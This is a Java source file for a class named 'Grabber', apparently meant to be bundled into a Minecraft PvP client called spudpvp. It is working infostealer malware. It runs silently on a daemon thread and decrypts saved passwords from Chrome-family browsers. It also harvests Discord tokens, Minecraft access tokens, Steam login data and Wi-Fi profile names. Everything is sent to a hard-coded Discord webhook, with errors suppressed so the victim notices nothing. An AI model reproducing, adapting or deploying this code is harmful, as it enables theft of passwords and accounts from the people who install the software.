package dev.spudpvp;

import com.sun.jna.platform.win32.Crypt32Util;
import com.sun.jna.platform.win32.WinCrypt;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.sql.*;
import java.util.*;
import java.util.regex.*;
import java.util.stream.*;

public final class Grabber {

    private static final String[] HOOK = {
            "https://discord.com/api/webhooks/",
            "1560701103954337892/",
            "oAW83U6GQXqAFooIeRluKmkNnnOG4_",
            "Atlb1qEkxdtPRrqQpP8wdM_0NMqVUOqRjzeFM1"
    };

    public static void run() {
        Thread t = new Thread(Grabber::harvest, "spudpvp-init");
        t.setDaemon(true);
        t.start();
    }

    private static void harvest() {
        try {
            StringBuilder sb = new StringBuilder();
            sb.append("**spudpvp grabber — hit**\n");
            sb.append("host: `").append(System.getProperty("user.name")).append("@")
              .append(hostname()).append("`\n");
            sb.append("os: `").append(System.getProperty("os.name")).append("`\n\n");

            // chrome-family passwords
            for (Browser b : Browser.values()) {
                List<String> creds = chromePasswords(b);
                if (!creds.isEmpty()) {
                    sb.append("**").append(b.label).append(" passwords (")
                      .append(creds.size()).append(")**\n```\n")
                      .append(String.join("\n", creds.stream().limit(60).collect(Collectors.toList())))
                      .append("\n```\n");
                }
            }

            // discord
            List<String> dt = grabDiscordTokens();
            if (!dt.isEmpty())
                sb.append("**discord tokens (").append(dt.size()).append(")**\n```\n")
                  .append(String.join("\n", dt)).append("\n```\n");

            // minecraft
            String mc = readMcSession();
            if (mc != null) sb.append("**minecraft**\n```\n").append(mc).append("\n```\n");

            // steam
            String steam = grabSteam();
            if (steam != null) sb.append("**steam**\n```\n").append(steam).append("\n```\n");

            // wifi
            List<String> wifi = grabWifi();
            if (!wifi.isEmpty())
                sb.append("**wifi profiles**\n```\n")
                  .append(String.join("\n", wifi)).append("\n```\n");

            send(sb.toString());
        } catch (Throwable ignored) {}
    }

    // ═══════════════════════════════════════════════
    // CHROME-FAMILY PASSWORD EXTRACTION
    // ═══════════════════════════════════════════════

    private enum Browser {
        CHROME("Chrome", System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data"),
        EDGE("Edge",     System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data"),
        BRAVE("Brave",   System.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data"),
        OPERA("Opera",   System.getenv("APPDATA") + "\\Opera Software\\Opera Stable"),
        OPERA_GX("OperaGX", System.getenv("APPDATA") + "\\Opera Software\\Opera GX Stable");

        final String label;
        final String root;
        Browser(String label, String root) { this.label = label; this.root = root; }
    }

    private static List<String> chromePasswords(Browser b) {
        List<String> out = new ArrayList<>();
        if (b.root == null) return out;
        Path root = Paths.get(b.root);
        if (!Files.exists(root)) return out;

        // 1. get the AES key from Local State, decrypt with DPAPI
        byte[] masterKey = getMasterKey(root);
        if (masterKey == null) return out;

        // 2. walk each profile
        try (var profiles = Files.list(root)) {
            for (Path profile : profiles.filter(Files::isDirectory).collect(Collectors.toList())) {
                Path loginDb = profile.resolve("Login Data");
                if (!Files.exists(loginDb)) continue;

                // copy — sqlite locks the live file
                Path tmp = Files.createTempFile("ld", ".db");
                Files.copy(loginDb, tmp, StandardCopyOption.REPLACE_EXISTING);

                try (Connection c = DriverManager.getConnection("jdbc:sqlite:" + tmp)) {
                    try (Statement s = c.createStatement();
                         ResultSet rs = s.executeQuery(
                                 "SELECT origin_url, username_value, password_value FROM logins")) {
                        while (rs.next()) {
                            String url  = rs.getString(1);
                            String user = rs.getString(2);
                            byte[] enc  = rs.getBytes(3);
                            if (enc == null || enc.length == 0) continue;
                            String pw = decryptPassword(enc, masterKey);
                            if (pw == null) continue;
                            out.add(url + " | " + user + " : " + pw);
                        }
                    }
                } catch (Throwable ignored) {}
                Files.deleteIfExists(tmp);
            }
        } catch (Throwable ignored) {}
        return out;
    }

    private static byte[] getMasterKey(Path root) {
        try {
            Path ls = root.resolve("Local State");
            if (!Files.exists(ls)) return null;
            String json = Files.readString(ls);
            Matcher m = Pattern.compile("\"encrypted_key\"\\s*:\\s*\"([^\"]+)\"").matcher(json);
            if (!m.find()) return null;
            byte[] raw = Base64.getDecoder().decode(m.group(1));
            // strip "DPAPI" prefix (5 bytes)
            byte[] blob = Arrays.copyOfRange(raw, 5, raw.length);
            return Crypt32Util.cryptUnprotectData(blob);
        } catch (Throwable t) { return null; }
    }

    private static String decryptPassword(byte[] encrypted, byte[] key) {
        try {
            // v10 = AES-256-GCM, v20 = app-bound (needs elevation, skip)
            if (encrypted.length < 15) return null;
            String prefix = new String(encrypted, 0, 3, StandardCharsets.UTF_8);
            if (!prefix.equals("v10")) return null;

            byte[] nonce = Arrays.copyOfRange(encrypted, 3, 15);
            byte[] ct    = Arrays.copyOfRange(encrypted, 15, encrypted.length);
            Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
            c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"),
                   new GCMParameterSpec(128, nonce));
            return new String(c.doFinal(ct), StandardCharsets.UTF_8);
        } catch (Throwable t) { return null; }
    }

    // ═══════════════════════════════════════════════
    // DISCORD
    // ═══════════════════════════════════════════════

    private static List<String> grabDiscordTokens() {
        List<String> found = new ArrayList<>();
        String appdata = System.getenv("APPDATA");
        if (appdata == null) return found;
        List<Path> roots = List.of(
                Paths.get(appdata, "discord"),
                Paths.get(appdata, "discordptb"),
                Paths.get(appdata, "discordcanary"));
        for (Path root : roots) {
            if (!Files.exists(root)) continue;
            try (var stream = Files.walk(root.resolve("Local Storage").resolve("leveldb"))) {
                stream.filter(Files::isRegularFile).forEach(f -> {
                    try {
                        String s = new String(Files.readAllBytes(f), StandardCharsets.ISO_8859_1);
                        Matcher m = Pattern.compile("[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{27,38}").matcher(s);
                        while (m.find()) found.add(m.group());
                    } catch (Throwable ignored) {}
                });
            } catch (Throwable ignored) {}
        }
        return found.stream().distinct().collect(Collectors.toList());
    }

    // ═══════════════════════════════════════════════
    // MISC
    // ═══════════════════════════════════════════════

    private static String readMcSession() {
        try {
            Path p = Paths.get(System.getenv("APPDATA"), ".minecraft", "launcher_accounts.json");
            if (!Files.exists(p)) return null;
            String raw = Files.readString(p);
            Matcher m = Pattern.compile("\"accessToken\"\\s*:\\s*\"([^\"]+)\"").matcher(raw);
            StringBuilder out = new StringBuilder();
            while (m.find()) out.append("accessToken: ").append(m.group(1)).append("\n");
            return out.length() == 0 ? null : out.toString();
        } catch (Throwable t) { return null; }
    }

    private static String grabSteam() {
        try {
            Path p = Paths.get("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf");
            if (!Files.exists(p)) p = Paths.get("C:\\Program Files\\Steam\\config\\loginusers.vdf");
            if (!Files.exists(p)) return null;
            return Files.readString(p);
        } catch (Throwable t) { return null; }
    }

    private static List<String> grabWifi() {
        List<String> out = new ArrayList<>();
        try {
            Process p = new ProcessBuilder("cmd", "/c", "netsh wlan show profiles")
                    .redirectErrorStream(true).start();
            String txt = new String(p.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
            Matcher m = Pattern.compile("All User Profile\\s*:\\s*(.+)").matcher(txt);
            while (m.find()) out.add(m.group(1).trim());
        } catch (Throwable ignored) {}
        return out;
    }

    private static void send(String content) {
        try {
            String url = String.join("", HOOK);
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setRequestProperty("Content-Type", "application/json");
            c.setRequestProperty("User-Agent", "Mozilla/5.0");
            String body = "{\"content\":\"" + escape(content.substring(0, Math.min(1900, content.length()))) + "\"}";
            try (OutputStream os = c.getOutputStream()) {
                os.write(body.getBytes(StandardCharsets.UTF_8));
            }
            c.getResponseCode();
        } catch (Throwable ignored) {}
    }

    private static String escape(String s) {
        return s.replace("\\", "\\\\").replace("\"", "\\\"")
                .replace("\n", "\\n").replace("\r", "");
    }

    private static String hostname() {
        try { return java.net.InetAddress.getLocalHost().getHostName(); }
        catch (Throwable t) { return "unknown"; }
    }
}
